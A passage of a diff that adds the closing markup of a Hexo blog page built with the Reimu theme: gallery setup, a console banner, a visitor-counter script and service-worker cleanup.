+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.5' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
